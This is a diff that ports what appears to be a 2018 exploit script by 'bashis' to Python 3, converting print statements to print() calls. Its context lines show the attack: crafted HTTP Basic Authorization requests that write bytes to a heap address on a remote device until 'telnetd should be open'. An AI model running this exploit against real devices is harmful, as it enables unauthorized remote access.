@@ -11,6 +11,7 @@
 #
 # Author: bashis <mcw noemail eu>, 2018
 #
+from __future__ import print_function
 import socket
 import select
 import sys
@@ -86,10 +87,10 @@ if __name__ == "__main__":
 		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ str(rport) +']')
 		args = arg_parser.parse_args()
 	except Exception as e:
-		print INFO,"\nError: {}\n".format(str(e))
+		print(INFO,"\nError: {}\n".format(str(e)))
 		sys.exit(1)
 
-	print INFO
+	print(INFO)
 	if args.rport:
 		rport = int(args.rport)
 
@@ -99,13 +100,13 @@ if __name__ == "__main__":
 
 	# Check if RPORT is valid
 	if not Validate(True).Port(rport):
-		print "[!] Invalid RPORT - Choose between 1 and 65535"
+		print("[!] Invalid RPORT - Choose between 1 and 65535")
 		sys.exit(1)
 
 	# Check if RHOST is valid IP or FQDN, get IP back
 	rhost = Validate(True).Host(rhost)
 	if not rhost:
-		print "[!] Invalid RHOST"
+		print("[!] Invalid RHOST")
 		sys.exit(1)
 
 	timeout = 5
@@ -165,7 +166,7 @@ if __name__ == "__main__":
 	#
 	for where in range(0, len(PASSWD)):
 		OUT = "GET / HTTP/1.0\nAuthorization: Basic {}{}\n\n".format(MESSAGE,struct.pack('<L',HEAP_PWD)[:3])
-		print "Writing to: {}".format(hex(HEAP_PWD))
+		print("Writing to: {}".format(hex(HEAP_PWD)))
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((rhost, rport))
 		s.send(OUT)
@@ -175,7 +176,7 @@ if __name__ == "__main__":
 
 		if response[1]:
 			if response[1] == "200":
-				print "({}) OK, telnetd should be open!".format(response[1])
+				print("({}) OK, telnetd should be open!".format(response[1]))
 				break
 
 
